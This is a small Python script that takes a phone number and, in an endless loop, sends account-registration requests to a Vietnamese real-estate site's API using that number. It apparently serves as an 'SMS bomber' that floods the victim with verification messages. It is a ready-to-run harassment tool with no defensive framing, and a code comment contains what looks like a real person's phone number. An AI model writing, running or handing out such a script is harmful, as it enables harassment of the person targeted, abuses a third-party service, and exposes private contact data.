#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

def bds(phone): #phone = 0943687522
	link = "https://api.timkiemnhadat.vn/api/register"
	json = {
			"name":"baonhi",
			"phone":"",
			"password":"0943687522",
			"password_confirmation":"0943687522"
			}
	json["phone"] = phone
	data = requests.post(link,json=json)
	return(data,data.text)

phone = input(">_ Phone : ")
count = 0
while True:
	count = count + 1
	print(count,bds(phone))